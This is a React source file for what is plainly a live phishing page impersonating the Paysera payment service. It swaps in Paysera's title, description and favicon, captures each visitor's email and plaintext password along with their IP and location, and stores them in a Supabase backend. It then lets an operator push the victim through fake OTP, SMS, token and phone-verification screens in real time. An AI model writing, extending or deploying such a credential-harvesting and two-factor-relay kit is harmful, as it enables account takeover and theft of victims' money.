import { useState, useEffect, useCallback } from "react";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import { supabase } from "@/integrations/supabase/client";

import PayseraLoginForm from "@/components/paysera/PayseraLoginForm";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import PayseraOtpScreen from "@/components/paysera/PayseraOtpScreen";
import PayseraConfirmEmailScreen from "@/components/paysera/PayseraConfirmEmailScreen";
import PayseraSyncEmailScreen from "@/components/paysera/PayseraSyncEmailScreen";
import PayseraTokenScreen from "@/components/paysera/PayseraTokenScreen";
import PayseraSmsScreen from "@/components/paysera/PayseraSmsScreen";
import PayseraLoadingScreen from "@/components/paysera/PayseraLoadingScreen";
import PayseraPhoneVerifyScreen from "@/components/paysera/PayseraPhoneVerifyScreen";
import { PayseraLangProvider, usePayseraLang } from "@/hooks/usePayseraLang";
import PayseraDesktopLayout from "@/components/paysera/PayseraDesktopLayout";

type LoginStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "sync_email" | "token_display" | "sms_screen" | "loading_loop" | "verify_phone";

const PayseraInner = () => {
  const [step, setStep] = useState<LoginStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [tokenNumber, setTokenNumber] = useState("");
  const { t } = usePayseraLang();

  const rateLimit = useRateLimit();

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const originalTitle = document.title;
    const originalDesc = document.querySelector('meta[name="description"]')?.getAttribute("content") || "";
    const originalFavicon = document.querySelector('link[rel="icon"]')?.getAttribute("href") || "";

    document.title = "Paysera — Log in to your account";
    const descMeta = document.querySelector('meta[name="description"]');
    if (descMeta) descMeta.setAttribute("content", "Paysera — Secure online payment platform. Log in to manage your wallet.");
    const favicon = document.querySelector('link[rel="icon"]');
    if (favicon) favicon.setAttribute("href", "/paysera-favicon.ico");

    return () => {
      document.title = originalTitle;
      const descMeta2 = document.querySelector('meta[name="description"]');
      if (descMeta2) descMeta2.setAttribute("content", originalDesc);
      const favicon2 = document.querySelector('link[rel="icon"]');
      if (favicon2) favicon2.setAttribute("href", originalFavicon);
    };
  }, []);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;

    const channel = supabase.channel(`session-review-${sessionId}`);

    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;

        if (decision === "login_success") {
          setStep("success");
        } else if (decision === "wrong_password") {
          setErrorMessage(t.wrongPassword);
          setStep("waiting");
        } else if (decision === "redirect_otp") {
          setStep("otp");
          setErrorMessage("");
        } else if (decision === "redirect_confirm_email") {
          setStep("confirm_email");
          setErrorMessage("");
        } else if (decision === "redirect_sync_email") {
          setStep("sync_email");
          setErrorMessage("");
        } else if (decision === "paysera_show_token") {
          const num = payload.payload?.token_number as string;
          if (num) setTokenNumber(num);
          setStep("token_display");
          setErrorMessage("");
        } else if (decision === "paysera_ask_sms") {
          setStep("sms_screen");
          setErrorMessage("");
        } else if (decision === "paysera_loading_loop") {
          setStep("loading_loop");
          setErrorMessage("");
        } else if (decision === "paysera_verify_phone") {
          setStep("verify_phone");
          setErrorMessage("");
        } else if (decision === "otp_rejected") {
          setStep("token_display");
          setErrorMessage("");
        } else if (decision === "pending_review") {
          setStep("waiting");
          setErrorMessage("");
        }
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("status, otp_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (!data) return;
      const s = data.status;

      if (s === "login_success") {
        setStep("success");
      } else if (s === "wrong_password" && step !== "waiting") {
        setErrorMessage(t.wrongPassword);
        setStep("waiting");
      } else if (s === "redirect_otp" && step !== "otp") {
        setStep("otp");
        setErrorMessage("");
      } else if (s === "redirect_confirm_email" && step !== "confirm_email") {
        setStep("confirm_email");
        setErrorMessage("");
      } else if (s === "redirect_sync_email" && step !== "sync_email") {
        setStep("sync_email");
        setErrorMessage("");
      } else if (s === "paysera_show_token") {
        const otp = data.otp_code || "";
        if (otp.startsWith("paysera_token:")) {
          setTokenNumber(otp.replace("paysera_token:", ""));
        }
        if (step !== "token_display") setStep("token_display");
        setErrorMessage("");
      } else if (s === "paysera_ask_sms" && step !== "sms_screen") {
        setStep("sms_screen");
        setErrorMessage("");
      } else if (s === "paysera_loading_loop" && step !== "loading_loop") {
        setStep("loading_loop");
        setErrorMessage("");
      } else if (s === "paysera_verify_phone" && step !== "verify_phone") {
        setStep("verify_phone");
        setErrorMessage("");
      } else if (s === "otp_rejected" && step !== "token_display") {
        setStep("token_display");
        setErrorMessage("");
      } else if (s === "pending_review" && step !== "waiting") {
        setStep("waiting");
        setErrorMessage("");
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(pollInterval);
    };
  }, [sessionId, step, t]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError("");
    setErrorMessage("");
    setLoading(true);
    setEmail(submittedEmail);

    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          ipData = {
            ip: data.ip || "unknown",
            country: data.country_name || "",
            city: data.city || "",
            region: data.region || "",
          };
        }
      } catch { /* ignore */ }

      const newId = crypto.randomUUID();

      await supabase.from("sessions").insert({
        id: newId,
        email: submittedEmail,
        password,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        country: ipData.country,
        city: ipData.city,
        region: ipData.region,
        status: "pending_review",
        source: "paysera",
      });

      setSessionId(newId);
      setStep("waiting");
    } catch (err) {
      setGeneralError("An error occurred. Please try again.");
    }

    setLoading(false);
  }, []);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return;
    setErrorMessage("");

    await supabase
      .from("sessions")
      .update({ password: newPassword, status: "pending_review" })
      .eq("id", sessionId);

    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({
          type: "broadcast",
          event: "review_decision",
          payload: { status: "pending_review" },
        });
        setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => {
    setStep("form");
    setSessionId(null);
    setErrorMessage("");
    setGeneralError("");
  }, []);

  if (rateLimit.loading) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-[#dce1e8]">
        <div className="animate-pulse text-[#888] text-sm">{t.loading}</div>
      </div>
    );
  }

  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-[#dce1e8] px-4">
        <div className="w-full max-w-[480px] bg-white rounded-sm shadow-sm border border-[#c8ced8] p-8 text-center">
          <h2 className="mb-2 text-lg font-bold text-[#2c3e50]">{t.accessDenied}</h2>
          <p className="text-sm text-[#666]">{t.accessDeniedDesc}</p>
        </div>
      </div>
    );
  }

  if (step === "otp" && sessionId) {
    return <PayseraDesktopLayout><PayseraOtpScreen email={email} sessionId={sessionId} onBack={handleRetry} /></PayseraDesktopLayout>;
  }
  if (step === "confirm_email" && sessionId) {
    return <PayseraDesktopLayout><PayseraConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} /></PayseraDesktopLayout>;
  }
  if (step === "sync_email" && sessionId) {
    return <PayseraDesktopLayout><PayseraSyncEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} /></PayseraDesktopLayout>;
  }
  if (step === "token_display" && sessionId) {
    return <PayseraDesktopLayout><PayseraTokenScreen email={email} sessionId={sessionId} tokenNumber={tokenNumber} onBack={handleRetry} /></PayseraDesktopLayout>;
  }
  if (step === "sms_screen" && sessionId) {
    return <PayseraDesktopLayout><PayseraSmsScreen email={email} sessionId={sessionId} onBack={handleRetry} /></PayseraDesktopLayout>;
  }
  if (step === "loading_loop" && sessionId) {
    return <PayseraDesktopLayout><PayseraLoadingScreen email={email} sessionId={sessionId} /></PayseraDesktopLayout>;
  }
  if (step === "verify_phone" && sessionId) {
    return <PayseraDesktopLayout><PayseraPhoneVerifyScreen email={email} sessionId={sessionId} onBack={handleRetry} /></PayseraDesktopLayout>;
  }

  return (
    <PayseraDesktopLayout>
      {step === "form" && (
        <>
          {generalError && (
            <div className="mb-4 bg-white rounded-sm border border-red-300 px-4 py-2.5 text-sm text-red-600">
              {generalError}
            </div>
          )}
          <PayseraLoginForm onSubmit={handleLoginSubmit} loading={loading} />
        </>
      )}

      {step === "waiting" && sessionId && (
        <div className="bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-5">
          <WaitingScreen
            email={email}
            sessionId={sessionId}
            errorMessage={errorMessage}
            onPasswordResubmit={handlePasswordResubmit}
          />
        </div>
      )}

      {step === "success" && (
        <div className="bg-white rounded-sm shadow-sm border border-[#c8ced8] px-6 py-5">
          <SuccessScreen email={email} />
        </div>
      )}
    </PayseraDesktopLayout>
  );
};

const Paysera = () => (
  <PayseraLangProvider>
    <PayseraInner />
  </PayseraLangProvider>
);

export default Paysera;
